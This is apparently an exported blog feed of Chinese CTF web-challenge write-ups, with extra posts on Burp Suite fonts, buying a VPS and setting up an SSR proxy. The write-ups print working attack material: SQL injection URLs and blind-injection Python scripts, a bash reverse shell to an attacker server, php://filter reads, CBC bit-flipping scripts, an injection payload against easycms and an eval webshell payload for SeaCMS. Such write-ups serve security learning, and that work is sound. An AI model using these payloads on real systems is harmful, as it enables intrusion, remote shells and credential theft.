可以直接报错了，所以接下来使用load_file这个函数，因为substr的长度只有30位，而且加载的是一个文件，所以需要多试试:1http://103.238.227.13:10088/?id=1/**/and/**/updatexml(1,concat(0x7e,substr(load_file(0x2f7661722f746573742f6b65795f312e706870),75,100),0x7e),1) 大概就是75到125的位置得到的flag，但是提交的时候是中文的双引号，这个地方有点坑 Trim的日记本直接扫后台得到show.php，本来以为是一个代码审计，但是直接给出了flag.. 1http://120.24.86.145:9002/show.php login2(SKCTF)首先拿到题目看了看源码没给提示，直接抓个包，在响应包中可以看到tip: 1JHNxbD0iU0VMRUNUIHVzZXJuYW1lLHBhc3N3b3JkIEZST00gYWRtaW4gV0hFUkUgdXNlcm5hbWU9JyIuJHVzZXJuYW1lLiInIjsKaWYgKCFlbXB0eSgkcm93KSAmJiAkcm93WydwYXNzd29yZCddPT09bWQ1KCRwYXNzd29yZCkpewp9 base64解码之后是: 123$sql=&quot;SELECT username,password FROM admin WHERE username=&apos;&quot;.$username.&quot;&apos;&quot;;if (!empty($row) &amp;&amp; $row[&apos;password&apos;]===md5($password))&#123;&#125; 可以看到是先提交的用户名之后再从数据中查询密码，随后再核对密码，然后也没有对username进行过滤的操作，此时构造语句：1username=&apos; union select md5(1),md5(1) # 理解起来很简单，就是先闭合前面的单引号，使得前面为空，然后联合查询出md5(1)，随后将password置为1，就能绕过了 进来之后是一个进程监测系统，随便输了几个字符： 发现了sh -c ps -aux | grep,能执行命令，所以很简单，弹个shell就行直接bash弹shell1|bash -i &gt;&amp; /dev/tcp/服务器ip/8888 0&gt;&amp;1 拿到shell 之后 cat f* 拿到flag login3(SKCTF)题目先给了提示，基于布尔的SQL盲注，经过测试之后可以发现是有admin这个账户的，除开提示密码错误，然后还提示用户不存在，上脚本： 1234567891011121314151617181920212223import requestsstr_all=&quot;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ &#123;&#125;+-*/=&quot;url=&quot;http://118.89.219.210:49167/index.php&quot;r=requests.session()def password(): resutlt=&quot;&quot; for i in range(40): fla=0 for j in range(32,127): playlod = &quot;admin&apos;^(ascii(mid((select(password)from(admin))from(&#123;&#125;)))&lt;&gt;&#123;&#125;)^0#&quot;.format(str(i+1),str(j)) data = &#123; &quot;username&quot;: playlod, &quot;password&quot;: &quot;123&quot; &#125; s=r.post(url,data) if &quot;error&quot; in s.text: resutlt+=chr(j) fla=1 print(&apos;**************************&apos;,resutlt) if fla==0: breakpassword() 然后得到一串md5，解密得到flag{skctf123456} 文件上传(湖湘杯)一开始试了很多方法绕过上传，但是没成功，然后看到了url: 1http://123.206.87.240:9011/?op=upload 居然有个可控的变量，然后发现这个变量是根据文件的名字进行读取的，然后试了试: 1http://123.206.87.240:9011/flag.php 并且扫描发现存在flag.php，所以大概率是伪协议了，试了试:1http://123.206.87.240:9011/?op=php://filter//read=convert.base64-encode/resource=flag base64解码直接得到flag123&lt;?php$flag=&quot;flag&#123;e00f8931037cbdb25f6b1d82dfe5552f&#125;&quot;;?&gt; login4这题是CBC字节翻转攻击,参考l1nk3r大佬的文章先扫目录得到.index.php.swp，恢复之后:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;Login Form&lt;/title&gt;&lt;link href=&quot;static/css/style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; /&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;static/js/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt;$(document).ready(function() &#123; $(&quot;.username&quot;).focus(function() &#123; $(&quot;.user-icon&quot;).css(&quot;left&quot;,&quot;-48px&quot;); &#125;); $(&quot;.username&quot;).blur(function() &#123; $(&quot;.user-icon&quot;).css(&quot;left&quot;,&quot;0px&quot;); &#125;); $(&quot;.password&quot;).focus(function() &#123; $(&quot;.pass-icon&quot;).css(&quot;left&quot;,&quot;-48px&quot;); &#125;); $(&quot;.password&quot;).blur(function() &#123; $(&quot;.pass-icon&quot;).css(&quot;left&quot;,&quot;0px&quot;); &#125;);&#125;);&lt;/script&gt;&lt;/head&gt;&lt;?phpdefine(&quot;SECRET_KEY&quot;, file_get_contents(&apos;/root/key&apos;));define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);session_start();function get_random_iv()&#123; $random_iv=&apos;&apos;; for($i=0;$i&lt;16;$i++)&#123; $random_iv.=chr(rand(1,255)); &#125; return $random_iv;&#125;function login($info)&#123; $iv = get_random_iv(); $plain = serialize($info); $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv); $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;]; setcookie(&quot;iv&quot;, base64_encode($iv)); setcookie(&quot;cipher&quot;, base64_encode($cipher));&#125;function check_login()&#123; if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;]))&#123; $cipher = base64_decode($_COOKIE[&apos;cipher&apos;]); $iv = base64_decode($_COOKIE[&quot;iv&quot;]); if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123; $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&lt;/p&gt;&quot;); $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;]; &#125;else&#123; die(&quot;ERROR!&quot;); &#125; &#125;&#125;function show_homepage()&#123; if ($_SESSION[&quot;username&quot;]===&apos;admin&apos;)&#123; echo &apos;&lt;p&gt;Hello admin&lt;/p&gt;&apos;; echo &apos;&lt;p&gt;Flag is $flag&lt;/p&gt;&apos;; &#125;else&#123; echo &apos;&lt;p&gt;hello &apos;.$_SESSION[&apos;username&apos;].&apos;&lt;/p&gt;&apos;; echo &apos;&lt;p&gt;Only admin can see flag&lt;/p&gt;&apos;; &#125; echo &apos;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&apos;;&#125;if(isset($_POST[&apos;username&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;]))&#123; $username = (string)$_POST[&apos;username&apos;]; $password = (string)$_POST[&apos;password&apos;]; if($username === &apos;admin&apos;)&#123; exit(&apos;&lt;p&gt;admin are not allowed to login&lt;/p&gt;&apos;); &#125;else&#123; $info = array(&apos;username&apos;=&gt;$username,&apos;password&apos;=&gt;$password); login($info); show_homepage(); &#125;&#125;else&#123; if(isset($_SESSION[&quot;username&quot;]))&#123; check_login(); show_homepage(); &#125;else&#123; echo &apos;&lt;body class=&quot;login-body&quot;&gt; &lt;div id=&quot;wrapper&quot;&gt; &lt;div class=&quot;user-icon&quot;&gt;&lt;/div&gt; &lt;div class=&quot;pass-icon&quot;&gt;&lt;/div&gt; &lt;form name=&quot;login-form&quot; class=&quot;login-form&quot; action=&quot;&quot; method=&quot;post&quot;&gt; &lt;div class=&quot;header&quot;&gt; &lt;h1&gt;Login Form&lt;/h1&gt; &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt; &lt;/div&gt; &lt;div class=&quot;content&quot;&gt; &lt;input name=&quot;username&quot; type=&quot;text&quot; class=&quot;input username&quot; value=&quot;Username&quot; onfocus=&quot;this.value=\&apos;\&apos;&quot; /&gt; &lt;input name=&quot;password&quot; type=&quot;password&quot; class=&quot;input password&quot; value=&quot;Password&quot; onfocus=&quot;this.value=\&apos;\&apos;&quot; /&gt; &lt;/div&gt; &lt;div class=&quot;footer&quot;&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot; class=&quot;button&quot; /&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt;&apos;; &#125;&#125;?&gt;&lt;/html&gt; cbc字节翻转攻击的原理简单解释一下: 首先将原文分成几个固定长度的块，然后有种对称加密算法来加密一些字符串， 其次还有一个叫Initialzation Vector(IV)的东西来保证明文在经过加密后，密文不相同的情况 然后最重要的一个就是CBC的算法（这里借助line大佬的公式方便理解一下）: 加密: Ciphertext-0 = Encrypt(Plaintext XOR IV)—只用于第一个组块 Ciphertext-N= Encrypt(Plaintext XOR Ciphertext-N-1)—用于第二及剩下的组块 解密: Plaintext-0 = Decrypt(Ciphertext) XOR IV—只用于第一个组块 Plaintext-N= Decrypt(Ciphertext) XOR Ciphertext-N-1—用于第二及剩下的组块 攻击原理就是通过改变其中某个字符的值，来达到我们需要满足的目的，并且在这题中，改变的同时，其他的值还不能改变，否则反序列化会出错。 开始做题,在我们随便拿一个帐号登录进去之后，可以看到: 同时对应的函数代码:12345678910function show_homepage()&#123; if ($_SESSION[&quot;username&quot;]===&apos;admin&apos;)&#123; echo &apos;&lt;p&gt;Hello admin&lt;/p&gt;&apos;; echo &apos;&lt;p&gt;Flag is $flag&lt;/p&gt;&apos;; &#125;else&#123; echo &apos;&lt;p&gt;hello &apos;.$_SESSION[&apos;username&apos;].&apos;&lt;/p&gt;&apos;; echo &apos;&lt;p&gt;Only admin can see flag&lt;/p&gt;&apos;; &#125; echo &apos;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&apos;;&#125; 跟踪一下，看看哪个地方调用了这个函数123456789101112131415if(isset($_POST[&apos;username&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;]))&#123; $username = (string)$_POST[&apos;username&apos;]; $password = (string)$_POST[&apos;password&apos;]; if($username === &apos;admin&apos;)&#123; exit(&apos;&lt;p&gt;admin are not allowed to login&lt;/p&gt;&apos;); &#125;else&#123; $info = array(&apos;username&apos;=&gt;$username,&apos;password&apos;=&gt;$password); login($info); show_homepage(); &#125;&#125;else&#123; if(isset($_SESSION[&quot;username&quot;]))&#123; check_login(); show_homepage(); &#125; 可以看到在调用这个函数之前还调用了login: 12345678function login($info)&#123; $iv = get_random_iv(); $plain = serialize($info); $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv); $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;]; setcookie(&quot;iv&quot;, base64_encode($iv)); setcookie(&quot;cipher&quot;, base64_encode($cipher));&#125; login的作用简单来说就是将传进去的用户名密码序列化，然后还有将此时的用户名写进session中，并且将序列化后的用户名密码进行加密， 123456789101112function check_login()&#123; if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;]))&#123; $cipher = base64_decode($_COOKIE[&apos;cipher&apos;]); $iv = base64_decode($_COOKIE[&quot;iv&quot;]); if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123; $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&lt;/p&gt;&quot;); $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;]; &#125;else&#123; die(&quot;ERROR!&quot;); &#125; &#125;&#125; check_login的作用跟login差不多是相反的，但是问题就出在此时的$info变量我们是可以通过cookie控制的，所以才有了cbc字节翻转攻击回到第一段代码： 123456789101112131415if(isset($_POST[&apos;username&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;]))&#123; $username = (string)$_POST[&apos;username&apos;]; $password = (string)$_POST[&apos;password&apos;]; if($username === &apos;admin&apos;)&#123; exit(&apos;&lt;p&gt;admin are not allowed to login&lt;/p&gt;&apos;); &#125;else&#123; $info = array(&apos;username&apos;=&gt;$username,&apos;password&apos;=&gt;$password); login($info); show_homepage(); &#125;&#125;else&#123; if(isset($_SESSION[&quot;username&quot;]))&#123; check_login(); show_homepage(); &#125;else&#123; 如果将代码读明白了，可以很明显的知道， 1234567if($username === &apos;admin&apos;)&#123; exit(&apos;&lt;p&gt;admin are not allowed to login&lt;/p&gt;&apos;); &#125;else&#123; $info = array(&apos;username&apos;=&gt;$username,&apos;password&apos;=&gt;$password); login($info); show_homepage(); &#125; 这一段代码是跟根本不可能得到flag的，因为$info里是不能出现admin的，所以重点就在else里的show_homepage了，cookie可控，开始解题首先我们使用admi2,haha登录进去，这里已经产生了cookie: 先序列化一下$info这个数组然后分个组： 123456a:2:&#123;s:8:&quot;username&quot;;s:5:&quot;admi2&quot;;s:8:&quot;password&quot;;s:4:&quot;haha&quot;;&#125;a:2:&#123;s:8:&quot;username&quot;;s:5:&quot;admi2&quot;;s:8:&quot;password&quot;;s:4:&quot;haha&quot;;&#125; 接下来要做的就是更改cookie，使得session[&#39;username&#39;]=admin,同样借助一下大佬的脚本： 1234567891011import base64from urllib import unquotefrom urllib import quote_pluscipher = &apos;*********&apos; #这里写cookie中的ciphercipher = unquote(cipher)cipher_de = base64.b64decode(cipher)ch = chr(ord(cipher_de[13]) ^ ord(&apos;2&apos;) ^ ord(&apos;n&apos;)) #这里根据用户名可以稍作改变13对应的是第一组的13位于第二组的2进行运算cipher_de=cipher_de[0:13]+ch+cipher_de[14::]rs = base64.b64encode(cipher_de)print quote_plus(rs) 然后用得到的cipher替换掉之前的，然后在URL栏按回车，此时会提示你刚刚替换的cipher不能反序列化，这个地方出现的原因是由于第一组变了，解密之后与之前的不一样，所以提示失败接下来要做的就是将IV也替换掉，使得解密后能被反序列化，再一次的借助大佬的脚本 12345678910111213141516171819202122# -*- coding:utf-8 -*-import base64from urllib import unquotefrom urllib import quote_plusmingwen_de=&apos;x2FPwTAFf/svVLvvU25fDW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjA6IiI7fQ==&apos;#base64_decode(&apos;这里面的&apos;) can&apos;t unserializemingwen = base64.b64decode(mingwen_de)print mingweniv = &apos;6S%2FcC7czBRvE0iSkTANYaQ%3D%3D&apos;#此时cookie里的iviv = unquote(iv)iv_de = base64.b64decode(iv)new = &apos;a:2:&#123;s:8:&quot;userna&apos;for i in range(16): iv_de = iv_de[:i] + chr(ord(iv_de[i]) ^ ord(mingwen[i]) ^ ord(new[i])) + iv_de[i+1:]print(base64.b64encode(iv_de))#用这个结果把原来的iv换掉 然后就得到flag了，]]></content>
      <categories>
        <category>writeup</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[“百度杯”CTF比赛 登陆 writeup]]></title>
    <url>%2F2018%2F05%2F31%2Flogindft%2F</url>
    <content type="text"><![CDATA[打开页面是一个登陆框: 查看源代码： 什么都发现不了，但是这个表单中用户名密码的class有点奇怪，先记着 随便输入用户名和密码同时打开burpsuite抓包： 用万能密码试试： 提示密码错误，但是当提交or &#39;1&#39; = &#39;2时，显示的是： 猜测是个布尔型的盲注 试了很多函数不行，最后看的wp，用的是正则表达式：username=or user() regexp '^a' %23```1234567891011121314151617181920212223我们用burpsuite进行盲注：![](http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/59736271.jpg)然后字典选择`a~z,0~9,(),_`用的都是表的常用字符,然后开始爆破：![](http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/66273786.jpg)可以知道第一位是`u`，一直持续下去可以发现这个列的名字就是前面表单用户名的`class`然后密码也是，就不仔细说了，接下来爆列:将`user()`替换成`user_n3me`：![](http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/46135022.jpg)继续爆破：![](http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/42315072.jpg)可以知道第一位是b，重复这个过程就行了最终得到用户名：`bctf3dm1n`密码：`2bfb1532857ddc0033fdae5bde3facdf`md5解密之后是:`adminqwe123666`一个个爆破可以比较麻烦，这里给出c26大佬的py脚本： import stringimport requests url = ‘http://6990a7a5194048468ddd58ba76d76945610fd134a3ad4269.game.ichunqiu.com/Challenges/login.php&#39;headers = {‘User-Agent’: “Mozilla/5.0 (X11; Linux x86_64; rv:18.0) Gecko/20100101 Firefox/18.0”}payloads = string.ascii_letters + string.digitstemp = ‘’for i in range(40): print(“the”+str(i)+”one”) for p in payloads: payload = temp + p name = “admin’ or user_n3me like ‘{}%’ ;#”.format(payload) data = dict(username=name, passwrod=’test’) res = requests.post(url, headers=headers, data=data) if (len(res.content) == 12): temp = temp + p print(temp.ljust(32, ‘.’)) break`换url和列名就行。 登陆进去之后是这个页面： 那个.bctfg1t看起来像个.git文件，试了一下： 果然是个.git文件，githack跑完之后： 接下来很明显就是还原版本了，git cat-file -p 哈希一直到a1开头的哈希： 出来一个文件名,我们访问他：得到flag：]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>.git泄露</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[解决burpsuite里中文不显示的方法]]></title>
    <url>%2F2018%2F05%2F31%2Fbp%2F</url>
    <content type="text"><![CDATA[burpsuite中文显示不出，某些时候非常不好用 这里用的版本是1.7.26，其他的版本修改方式没有大的区别 打开burpsuite，找到user options: 然后在display中的http message display选择成中文字体，这里选择微软雅黑： 然后就成功了]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>burpsuite</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[i春秋 "百度杯" 九月场 123 writeup]]></title>
    <url>%2F2018%2F05%2F28%2F123%2F</url>
    <content type="text"><![CDATA[打开是个登陆界面： 查看一下源代码： 用户信息都在user.php里，密码的结构也告诉你了，猜想是爆破但是现在没有字典，我们先访问一下user.php，发现啥都没有，一开始以为是文件包含，但是没有变量可以用可能是备份文件获取，试试user.php.bak果然： 将文件下载下来之后发现是用户名的信息，打开burpsuite开始爆破：从1990年开始（大佬们wp写的，我也不知道为什么） 字典直接用刚刚的user.php 开始爆破： 得到了一个用户lixiuyun 密码 lixiuyun1990 登陆进去之后也是什么都没有，查看源代码： 本地构建html： php别名：php2, php3, php4, php5, phps, pht, phtm, phtml …都可以试试: 可以看到有个view.php了，打开看看这次估计真是文件包含了： 这里还有个过滤，将flag过滤了双写flag即可拿到flag：]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>爆破</tag>
        <tag>备份文件获取</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[i春秋 "百度杯" 九月场 Yeser writeup]]></title>
    <url>%2F2018%2F05%2F28%2FYeserCMS%2F</url>
    <content type="text"><![CDATA[打开来是一个不知道什么cms的页面： 上cms指纹识别： 但是貌似识别不出来，想想其他方法比如搜一搜传递的变量名，也就是URL后面跟着的一大堆东西 点进去看了看，跟题目的cms差不多差不多确定是easycms了，搜一搜easycms漏洞但是找到的大多数不能用，最终还是看了大佬们写的writeup在URL/celive/live/header.php处有一个xpath注入漏洞xpath注入科普payload：第一段： xajax=Postdata&amp;xajaxargs[0]=detail=xxxxxx%2527%252C%2528UpdateXML%25281%252CCONCAT%25280x5b%252Cmid%2528%2528SELECT%252f%252a%252a%252fGROUP_CONCAT%2528concat %2528username%252C%2527%257C%2527%252Cpassword %2529%2529%2520from%2520yesercms_user %2529%252C1%252C32%2529%252C0x5d %2529%252C1%2529%2529%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%2529–%2520 第二段： xajax=Postdata&amp;xajaxargs[0]=detail=xxxxxx%2527%252C%2528UpdateXML%25281%252CCONCAT%25280x5b%252Cmid%2528%2528SELECT%252f%252a%252a%252fGROUP_CONCAT%2528concat %2528username%252C%2527%257C%2527%252Cpassword %2529%2529%2520from%2520yesercms_user %2529%252C10%252C32%2529%252C0x5d %2529%252C1%2529%2529%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%2529–%2520这里得分成两段显示： 得到管理员的账户是admin密码是md5加密的Yeser231 登陆后台： 找地方上传shell，自己找了很久没有找到地方，最后还是看的大佬的wp在模版-&gt;当前模版编辑处 点击编辑，这个时候会把这个文件名传进去，然后再显示出来这个文件的内容： 这个时候直接看到提示：flag在网站根目录下的flag.php中把id换成../../flag.php即可得到flag:]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>xpath注入</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[i春秋 "百度杯" 九月场 Test writeup]]></title>
    <url>%2F2018%2F05%2F28%2Ftest%2F</url>
    <content type="text"><![CDATA[首先打开题目： 发现是一个海洋CMS，但是不太清楚版本往下翻一翻，发现有个年份 看得出是一个很老的版本了，题目的提示是：善于查资料，你就可以拿一血了好吧直接查资料：海洋cms漏洞利用 直接一大块的漏洞出来了。这里直接找到payload了：/search.php?searchtype=5&amp;tid=&amp;area=eval($_POST[cmd]) 然后打开菜刀：密码cmd连接即可： 连接成功： 可以发现在html/data下有个common.inc.php 这个是数据库的配置文件 菜刀连接数据库拿到flag:]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>命令执行</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Centos6&7 搭建ssr科学上网及IPv6免流]]></title>
    <url>%2F2018%2F05%2F27%2Fssr%2F</url>
    <content type="text"><![CDATA[1.购买vps这里给出链接，就不仔细介绍了 2.搭建ssr连接上xshell或者其他shell软件之后，复制以下命令：wget -N https://raw.githubusercontent.com/ToyoDAdoubi/doubi/master/ssr.shchmod +x ssr.shbash ssr.sh一条一条命令执行即可，执行完之后看到的是这个页面： 选择1安装ssr，将端口号设置成443，密码写个自己能记住的密码： 加密方式选择10. aes-256-cfb 协议插件和混淆插件分别选择：2.auth_sha1_v4和tls1.2_ticket_auth 询问是否兼容原版，原版就是ss，这里选择no，选择yes的话就能支持ss客户端了： 限制的设备数、单线程限速上限、每个端口的总速度，这里都直接回车，选择默认（不限速）：(这里自用，所以没有限速和限流) 回车之后就可以开始安装了： 出来这个页面的话，证明已经安装完成了，如果嫌麻烦的话，这样已经可以直接用了，但是如果你想多端口配置也是可以的,输入:bash ssr.sh进入ssr的管理页面, 如果之前的步骤有些小问题的话这里也是可以修改的，现在我们需要切换成多端口模式： 配置跟之前的单端口一样就行，设置成功后： 直接就有一个端口，这个端口是之前单端口设置的，进入管理页面： 多端口模式下7.用户配置可以添加新的端口： 操作跟之前一样，配置成功后： 3.客户端的安装SSR:Windows：https://nofile.io/f/6Jm7WJCyOVv/ShadowsocksR-4.7.0-win.7z安卓：https://nofile.io/f/rvTJoj0h5GC/shadowsocksr-release.apk windows版解压完之后直接运行： 任务栏会出现一个小飞机：首先我们把前面ssr的链接复制下来，然后右键小飞机，选择剪贴板导入即可。 安卓的比较简单，就不仔细截图了。首先将APK安装-&gt;然后点击顶上方的“▼”-&gt;选择右下方的“+”-&gt;从剪切板导入即可(同样得复制之前的ssr链接) SSWindows：https://github.com/shadowsocks/shadowsocks-windows/releases安卓：https://github.com/shadowsocks/shadowsocks-android/releases 使用方法跟ssr差不多，对照着就行。 4.bbr加速这一步主要是给自己的ssr提速复制以下命令到shell里: yum -y install wget wget --no-check-certificate https://github.com/teddysun/across/raw/master/bbr.sh chmod +x bbr.sh ./bbr.sh 安装完之后会提示你是否重启，选择y然后就能正常使用了。]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>免流</tag>
        <tag>科学上网</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[VPS的选择及购买]]></title>
    <url>%2F2018%2F05%2F27%2Fvps%2F</url>
    <content type="text"><![CDATA[这里主要讲述Vutrl的使用，搬瓦工也是可以的（因为都支持支付宝，简单快捷） 注册Vultr打开注册链接点击右上方的Create Account注册比较简单，输入邮箱密码创建就行进入邮箱确认，登陆后： 充值点击Billing,然后点击Make Payment下的Alipay 选择价格然后充值，第一次使用少充点，10美元就行觉得好用再继续充值就行，然后会跳转到支付宝的支付页面，用支付宝付款即可 添加服务器点击左侧的Servers可以看到右边有个“+”号：点击之后，这个页面是选择地区 在国内的话最好选择日本的服务器速度最快可以选择其他地区的比如纽约，洛杉矶，速度也不慢 选择系统类型，这里选择centos6，因为centos7的防火墙可能会导致ssr的一些服务不能用价格选择，当然是越贵越好了，但是这个好只是体现在连接的人数个人用的话选择最便宜的就行了。下方勾选Enable IPv6，需要IPv6免流的可以勾上 然后直接Deploy Now即可 这里附上一种测速方法： 使用ping命令： vutrl一开始最多可以创建5个VPS 创建完之后拿ping命令去试试速度 win+r 输入cmd 在控制台输入：ping 你的服务器IP 看看延迟就行，延迟越低速度越快 如果速度很慢的话把这个服务器删掉就行（创建5分钟之内不能消除） 连接服务器回到Servers页面点击刚刚创建的服务器这里的IP和密码待会得用到 这里有服务器的ssh我们需要使用shell软件来连接他这里演示的是xshell：从网上直接下载xshell就可以使用： 点击文件，新建 名称随便写个就行，主机处填写你服务器的IP然后点击左边的用户身份验证 用户名写root，密码从刚刚那个页面复制下来，然后点击连接就行出现这个页面就代表连接成功了:]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>vps购买</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[i春秋 “百度杯”login Writeup]]></title>
    <url>%2F2018%2F05%2F26%2Flogin%2F</url>
    <content type="text"><![CDATA[首先打开来是一个登陆的页面： 看看源码有没有什么提示： 可以看到最后面注释了两个test1 我们拿test1登陆进去试试： 登陆成功。左右看看没有什么发现。打开burpsuite抓包试试: 可以看到响应包有show这个参数，并且等于0我们将show这个参数等于1发送试试: 发送之后果然出现了一段代码： 这段代码的大概意思是： 当$login['user']='ichunqiu'的时候，echo flag 但是login只能从token中获得，并且被几个函数加密了， 我们只需要照着过程逆回去即可 payload： $arr = array('user'=>'ichunqiu'); $hello = base64_encode(gzcompress(serialize('$arr'))); echo $hello; 直接解析之后echo的值就是我们需要的token值,这里解密之后是这个： eJxLtDK0qi62MrFSKi1OLVKyLraysFLKTM4ozSvMLFWyrgUAo4oKXA== 将token放到cookie里发送即可得到flag:]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[i春秋"百度杯" 十月份Backdoor Write up]]></title>
    <url>%2F2018%2F05%2F26%2FBackdoor%2F</url>
    <content type="text"><![CDATA[春秋”百度杯” 十月份Backdoor Write up 首先题目提示: 敏感文件泄露 .git泄露： 使用githack将网站源码下载下来： 目录下有： 但是都是没有用的信息： 访问： .git/logs/refs/heads/master 猜想是还原版本： git checkout 734d08 然后再看看： 果然是，多试几个之后就出来一个不一样的flag文件： 访问b4ckdo0r.php： 其他地方没给什么提示，就试试有没有swp/swo文件：swp文件是vim编辑器不正常退出时产生的文件 URL/.b4ckdo0r.php.swp 或者 URL/.b4ckdo0r.php.swo 然后可以知道swp文件没有，但是`swo`文件存在 下载下来之后将后缀名`swo更改为swp` 在`linux`下进行还原 这里附上还原方法： 在linux下 假设你的swp文件叫'.index.php.swp' 可用带-r参数编辑 #vi -r index.php 然后wq保存即可 或者使用: #vi .index.php.swp 然后:recover 最后wq保存 还原出来之后是: php混淆加密，给出python脚本，参考链接将其中的URL换成题目的URL就行： 执行： python 保存的脚本名字.py b4ckdo0r.php 可以看到phpshell 执行 system('ls'); 查看即可得到flag: system('cat this_i5_flag.php');]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>.git泄露</tag>
        <tag>vim文件备份</tag>
      </tags>
  </entry>
</search>
